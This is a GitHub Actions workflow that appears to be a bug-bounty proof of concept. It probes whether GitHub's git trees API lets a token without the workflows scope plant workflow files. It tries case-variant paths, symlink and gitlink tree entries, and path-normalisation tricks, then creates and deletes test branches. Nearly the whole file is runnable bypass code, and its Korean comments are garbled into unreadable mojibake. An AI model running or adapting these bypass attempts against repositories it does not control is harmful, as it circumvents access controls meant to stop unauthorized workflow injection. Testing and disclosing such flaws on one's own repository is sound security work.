# PoC v3: Tree Path Bypass for Workflow Scope Enforcement
#
# ê°€ì„¤: POST /git/treesì˜ ê²½ë¡œ í•„í„°ê°€ ì •í™•íˆ ".github/workflows/" íŒ¨í„´ë§Œ ì°¨ë‹¨í•œë‹¤ë©´,
#       ëŒ€ì†Œë¬¸ì ë³€í˜•, symlink, path normalization ì°¨ì´ë¡œ ìš°íšŒ ê°€ëŠ¥
#
# âš ï¸ ë³¸ì¸ ì†Œìœ  í…ŒìŠ¤íŠ¸ repoì—ì„œë§Œ ì‹¤í–‰í•  ê²ƒ

name: Tree Path Bypass Tests
on:
  workflow_dispatch:

permissions:
  contents: write
  # ì˜ë„ì ìœ¼ë¡œ workflows scope ë¯¸í¬í•¨

env:
  API: https://api.github.com/repos/${{ github.repository }}

jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      head_sha: ${{ steps.info.outputs.head_sha }}
      head_tree: ${{ steps.info.outputs.head_tree }}
    steps:
      - name: Gather info
        id: info
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          BRANCH=$(curl -s -H "Authorization: token $GH_TOKEN" "$API" | jq -r '.default_branch')
          HEAD_SHA=$(curl -s -H "Authorization: token $GH_TOKEN" "$API/git/ref/heads/$BRANCH" | jq -r '.object.sha')
          HEAD_TREE=$(curl -s -H "Authorization: token $GH_TOKEN" "$API/git/commits/$HEAD_SHA" | jq -r '.tree.sha')
          echo "head_sha=$HEAD_SHA" >> $GITHUB_OUTPUT
          echo "head_tree=$HEAD_TREE" >> $GITHUB_OUTPUT
          echo "SHA: $HEAD_SHA  Tree: $HEAD_TREE"

  # ==============================================================
  # Test A: Case Variations
  # GitHub Actions workflow discoveryê°€ case-insensitiveì¼ ìˆ˜ ìˆìŒ
  # ==============================================================
  test-case-variations:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - name: "Test A: Case variations in tree path"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
        run: |
          echo "=== TEST A: Case Variations ==="

          WF_CONTENT='name: bypass-probe\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo proof-of-concept'

          # Create blob once
          BLOB_SHA=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/blobs" \
            -d "{\"content\":\"$WF_CONTENT\",\"encoding\":\"utf-8\"}" | jq -r '.sha')
          echo "Blob: $BLOB_SHA"

          # Array of case variations to test
          PATHS=(
            ".Github/workflows/bypass-a1.yml"
            ".github/Workflows/bypass-a2.yml"
            ".GITHUB/workflows/bypass-a3.yml"
            ".github/WORKFLOWS/bypass-a4.yml"
            ".Github/Workflows/bypass-a5.yml"
            ".GITHUB/WORKFLOWS/bypass-a6.yml"
          )

          for i in "${!PATHS[@]}"; do
            P="${PATHS[$i]}"
            echo ""
            echo "--- Testing path: $P ---"

            RESP=$(curl -s \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/trees" \
              -d "{
                \"base_tree\": \"$HEAD_TREE\",
                \"tree\": [{
                  \"path\": \"$P\",
                  \"mode\": \"100644\",
                  \"type\": \"blob\",
                  \"sha\": \"$BLOB_SHA\"
                }]
              }")

            TREE_SHA=$(echo "$RESP" | jq -r '.sha // empty')
            ERR=$(echo "$RESP" | jq -r '.message // empty')

            if [ -n "$TREE_SHA" ] && [ "$TREE_SHA" != "null" ]; then
              echo "::error::ğŸ”´ Tree created with path: $P â†’ SHA: $TREE_SHA"

              # Try to create a branch with this tree
              COMMIT_SHA=$(curl -s \
                -H "Authorization: token $GH_TOKEN" \
                -H "Accept: application/vnd.github+json" \
                -X POST "$API/git/commits" \
                -d "{\"message\":\"case bypass test\",\"tree\":\"$TREE_SHA\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')

              if [ -n "$COMMIT_SHA" ] && [ "$COMMIT_SHA" != "null" ]; then
                REF_RESP=$(curl -s -o /tmp/ref_a$i.json -w "%{http_code}" \
                  -H "Authorization: token $GH_TOKEN" \
                  -H "Accept: application/vnd.github+json" \
                  -X POST "$API/git/refs" \
                  -d "{\"ref\":\"refs/heads/bypass-case-$i\",\"sha\":\"$COMMIT_SHA\"}")

                echo "Ref creation HTTP: $REF_RESP"
                if [ "$REF_RESP" = "201" ]; then
                  echo "::error::ğŸ”´ğŸ”´ FULL BYPASS: Branch created with workflow at $P"

                  # Verify file exists
                  curl -s -H "Authorization: token $GH_TOKEN" \
                    "$API/contents/$P?ref=bypass-case-$i" | jq '{name, path, size}'

                  # Cleanup
                  curl -s -X DELETE -H "Authorization: token $GH_TOKEN" \
                    "$API/git/refs/heads/bypass-case-$i"
                fi
              fi
            else
              echo "âœ… Blocked: $ERR"
            fi
          done

  # ==============================================================
  # Test B: Symlink Mode (120000)
  # symlink tree entryê°€ í•„í„°ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ”ì§€
  # ==============================================================
  test-symlink-mode:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - name: "Test B: Symlink in .github/workflows/"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
        run: |
          echo "=== TEST B: Symlink Mode ==="
          echo "Create workflow content at non-protected path, symlink from .github/workflows/"

          WF_CONTENT='name: bypass-probe\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo proof-of-concept'

          # Blob 1: actual workflow content at safe path
          WF_BLOB=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/blobs" \
            -d "{\"content\":\"$WF_CONTENT\",\"encoding\":\"utf-8\"}" | jq -r '.sha')

          # Blob 2: symlink target (relative path)
          LINK_BLOB=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/blobs" \
            -d '{"content":"../../safe-dir/actual-workflow.yml","encoding":"utf-8"}' | jq -r '.sha')

          echo "WF Blob: $WF_BLOB"
          echo "Link Blob: $LINK_BLOB"

          # Strategy 1: symlink entry at .github/workflows/ pointing elsewhere
          echo ""
          echo "--- B1: Symlink at .github/workflows/bypass-b1.yml ---"
          RESP=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/trees" \
            -d "{
              \"base_tree\": \"$HEAD_TREE\",
              \"tree\": [
                {
                  \"path\": \"safe-dir/actual-workflow.yml\",
                  \"mode\": \"100644\",
                  \"type\": \"blob\",
                  \"sha\": \"$WF_BLOB\"
                },
                {
                  \"path\": \".github/workflows/bypass-b1.yml\",
                  \"mode\": \"120000\",
                  \"type\": \"blob\",
                  \"sha\": \"$LINK_BLOB\"
                }
              ]
            }")

          TREE_SHA=$(echo "$RESP" | jq -r '.sha // empty')
          ERR=$(echo "$RESP" | jq -r '.message // empty')

          if [ -n "$TREE_SHA" ] && [ "$TREE_SHA" != "null" ]; then
            echo "::error::ğŸ”´ Symlink tree created! SHA: $TREE_SHA"

            COMMIT_SHA=$(curl -s \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/commits" \
              -d "{\"message\":\"symlink bypass\",\"tree\":\"$TREE_SHA\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')

            REF_HTTP=$(curl -s -o /tmp/ref_b1.json -w "%{http_code}" \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/refs" \
              -d "{\"ref\":\"refs/heads/bypass-symlink-1\",\"sha\":\"$COMMIT_SHA\"}")

            echo "Ref HTTP: $REF_HTTP"
            if [ "$REF_HTTP" = "201" ]; then
              echo "::error::ğŸ”´ğŸ”´ FULL BYPASS via symlink!"
              curl -s -X DELETE -H "Authorization: token $GH_TOKEN" \
                "$API/git/refs/heads/bypass-symlink-1"
            fi
          else
            echo "âœ… Blocked: $ERR"
          fi

          # Strategy 2: Only safe path in tree (no .github/workflows/ at all)
          # Then use symlink from .github/workflows/ â†’ safe path
          echo ""
          echo "--- B2: Reverse symlink (.github/workflows is a symlink dir) ---"
          # Create a blob that is a symlink to safe-dir
          DIR_LINK_BLOB=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/blobs" \
            -d '{"content":"safe-dir","encoding":"utf-8"}' | jq -r '.sha')

          RESP2=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/trees" \
            -d "{
              \"base_tree\": \"$HEAD_TREE\",
              \"tree\": [
                {
                  \"path\": \"safe-dir/bypass-b2.yml\",
                  \"mode\": \"100644\",
                  \"type\": \"blob\",
                  \"sha\": \"$WF_BLOB\"
                },
                {
                  \"path\": \".github/workflows\",
                  \"mode\": \"120000\",
                  \"type\": \"blob\",
                  \"sha\": \"$DIR_LINK_BLOB\"
                }
              ]
            }")

          TREE_SHA2=$(echo "$RESP2" | jq -r '.sha // empty')
          ERR2=$(echo "$RESP2" | jq -r '.message // empty')

          if [ -n "$TREE_SHA2" ] && [ "$TREE_SHA2" != "null" ]; then
            echo "::error::ğŸ”´ Directory symlink tree created! SHA: $TREE_SHA2"

            COMMIT_SHA2=$(curl -s \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/commits" \
              -d "{\"message\":\"dir symlink bypass\",\"tree\":\"$TREE_SHA2\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')

            REF_HTTP2=$(curl -s -o /tmp/ref_b2.json -w "%{http_code}" \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/refs" \
              -d "{\"ref\":\"refs/heads/bypass-symlink-2\",\"sha\":\"$COMMIT_SHA2\"}")

            echo "Ref HTTP: $REF_HTTP2"
            if [ "$REF_HTTP2" = "201" ]; then
              echo "::error::ğŸ”´ğŸ”´ FULL BYPASS via directory symlink!"
              curl -s -X DELETE -H "Authorization: token $GH_TOKEN" \
                "$API/git/refs/heads/bypass-symlink-2"
            fi
          else
            echo "âœ… Blocked: $ERR2"
          fi

  # ==============================================================
  # Test C: Path Normalization Tricks
  # ==============================================================
  test-path-tricks:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - name: "Test C: Path normalization tricks"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
        run: |
          echo "=== TEST C: Path Normalization ==="

          WF_CONTENT='name: bypass-probe\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo proof-of-concept'

          BLOB_SHA=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/blobs" \
            -d "{\"content\":\"$WF_CONTENT\",\"encoding\":\"utf-8\"}" | jq -r '.sha')

          PATHS=(
            ".github/workflows/./bypass-c1.yml"
            ".github//workflows/bypass-c2.yml"
            ".github/workflows/bypass-c3.yml "
            ".github/workflows/bypass-c4.yml."
            ".github/workflo\u0077s/bypass-c5.yml"
            ".github/workflow\x73/bypass-c6.yml"
          )

          for i in "${!PATHS[@]}"; do
            P="${PATHS[$i]}"
            echo ""
            echo "--- Testing path: '$P' ---"

            RESP=$(curl -s \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/trees" \
              -d "{
                \"base_tree\": \"$HEAD_TREE\",
                \"tree\": [{
                  \"path\": \"$P\",
                  \"mode\": \"100644\",
                  \"type\": \"blob\",
                  \"sha\": \"$BLOB_SHA\"
                }]
              }")

            TREE_SHA=$(echo "$RESP" | jq -r '.sha // empty')
            ERR=$(echo "$RESP" | jq -r '.message // empty')

            if [ -n "$TREE_SHA" ] && [ "$TREE_SHA" != "null" ]; then
              echo "::error::ğŸ”´ Tree created with path trick: $P â†’ SHA: $TREE_SHA"

              COMMIT_SHA=$(curl -s \
                -H "Authorization: token $GH_TOKEN" \
                -H "Accept: application/vnd.github+json" \
                -X POST "$API/git/commits" \
                -d "{\"message\":\"path trick $i\",\"tree\":\"$TREE_SHA\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')

              if [ -n "$COMMIT_SHA" ] && [ "$COMMIT_SHA" != "null" ]; then
                REF_HTTP=$(curl -s -o /tmp/ref_c$i.json -w "%{http_code}" \
                  -H "Authorization: token $GH_TOKEN" \
                  -H "Accept: application/vnd.github+json" \
                  -X POST "$API/git/refs" \
                  -d "{\"ref\":\"refs/heads/bypass-path-$i\",\"sha\":\"$COMMIT_SHA\"}")

                echo "Ref HTTP: $REF_HTTP"
                if [ "$REF_HTTP" = "201" ]; then
                  echo "::error::ğŸ”´ğŸ”´ FULL BYPASS via path trick: $P"
                  # Check if GitHub Actions would discover this
                  curl -s -H "Authorization: token $GH_TOKEN" \
                    "$API/contents/.github/workflows/?ref=bypass-path-$i" | jq '.[].name' 2>/dev/null
                  curl -s -X DELETE -H "Authorization: token $GH_TOKEN" \
                    "$API/git/refs/heads/bypass-path-$i"
                fi
              fi
            else
              echo "âœ… Blocked: $ERR"
            fi
          done

  # ==============================================================
  # Test D: Submodule/Gitlink mode (160000)
  # ==============================================================
  test-gitlink:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - name: "Test D: Gitlink mode for .github/workflows"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
        run: |
          echo "=== TEST D: Gitlink (submodule) mode ==="
          echo "Replace .github/workflows with a submodule pointer"

          # Use HEAD_SHA as a fake submodule commit
          RESP=$(curl -s \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -X POST "$API/git/trees" \
            -d "{
              \"base_tree\": \"$HEAD_TREE\",
              \"tree\": [{
                \"path\": \".github/workflows\",
                \"mode\": \"160000\",
                \"type\": \"commit\",
                \"sha\": \"$HEAD_SHA\"
              }]
            }")

          TREE_SHA=$(echo "$RESP" | jq -r '.sha // empty')
          ERR=$(echo "$RESP" | jq -r '.message // empty')

          if [ -n "$TREE_SHA" ] && [ "$TREE_SHA" != "null" ]; then
            echo "âš ï¸ Gitlink tree created: $TREE_SHA"
            echo "This replaces .github/workflows/ with a submodule pointer"
            echo "If combined with a malicious external repo, could inject workflows"

            COMMIT_SHA=$(curl -s \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/commits" \
              -d "{\"message\":\"gitlink test\",\"tree\":\"$TREE_SHA\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')

            REF_HTTP=$(curl -s -o /tmp/ref_d.json -w "%{http_code}" \
              -H "Authorization: token $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -X POST "$API/git/refs" \
              -d "{\"ref\":\"refs/heads/bypass-gitlink\",\"sha\":\"$COMMIT_SHA\"}")

            echo "Ref HTTP: $REF_HTTP"
            jq '.' /tmp/ref_d.json 2>/dev/null | head -10

            if [ "$REF_HTTP" = "201" ]; then
              echo "::error::ğŸ”´ Gitlink bypass - .github/workflows replaced with submodule!"
              curl -s -X DELETE -H "Authorization: token $GH_TOKEN" \
                "$API/git/refs/heads/bypass-gitlink"
            fi
          else
            echo "âœ… Blocked: $ERR"
          fi

  # ==============================================================
  summary:
    needs: [test-case-variations, test-symlink-mode, test-path-tricks, test-gitlink]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Summary
        run: |
          echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
          echo "â•‘  TREE PATH BYPASS TEST RESULTS                â•‘"
          echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
          echo "â•‘ A: Case variations    â†’ Check logs            â•‘"
          echo "â•‘ B: Symlink mode       â†’ Check logs            â•‘"
          echo "â•‘ C: Path tricks        â†’ Check logs            â•‘"
          echo "â•‘ D: Gitlink mode       â†’ Check logs            â•‘"
          echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
          echo "â•‘ ğŸ”´ = bypass found â†’ HackerOne immediately     â•‘"
          echo "â•‘ âœ… = properly blocked                          â•‘"
          echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
